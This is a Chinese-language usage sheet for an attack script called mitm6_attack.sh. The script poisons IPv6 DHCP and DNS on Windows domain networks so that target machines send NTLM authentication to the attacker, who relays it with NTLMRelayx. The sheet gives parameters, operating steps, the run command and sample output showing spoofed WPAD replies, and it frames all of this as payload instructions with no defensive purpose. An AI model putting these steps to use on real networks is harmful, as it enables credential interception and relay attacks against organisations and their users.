## 📦 载荷使用说明：mitm6_attack.sh

### 📝 功能说明
通过伪造 IPv6 DHCP 和 DNS 响应，在仅使用 IPv4 的 Windows 网络中执行中间人攻击，迫使目标机器向攻击者发送 NTLM 认证请求。

### ⚙️ 参数说明
```text
- `-d`：目标域名（如 `contoso.com`）
- `-i`：攻击机连接内网的网卡接口（如 `eth0`）
```

### 🚀 操作步骤
1. 确认攻击机已接入目标内网（同一二层网络）。
2. 修改脚本中的目标域名和网卡接口。
3. 配合 NTLMRelayx 使用（将认证请求中继到其他服务）。
4. 执行脚本：`bash mitm6_attack.sh`，开始毒化网络。
5. 等待目标机器重启或重新获取网络配置时触发认证。

### 💻 执行样例
```bash
# 在 eth0 接口上毒化 contoso.com 域
./mitm6_attack.sh -d contoso.com -i eth0

# 预期输出：
# [*] Starting mitm6 using the following configuration:
# [*] Primary adapter: eth0 [00:11:22:33:44:55]
# [*] IPv4 address: 192.168.1.100
# [*] IPv6 address: fe80::211:22ff:fe33:4455
# [*] Spoofing DNS for domains: contoso.com
# [*] Listening for DHCPv6 and DNS traffic...
# [+] Sent DHCPv6 reply to fe80::abcd:ef01:2345:6789
# [+] Spoofed DNS reply for wpad.contoso.com to fe80::abcd:ef01:2345:6789
```
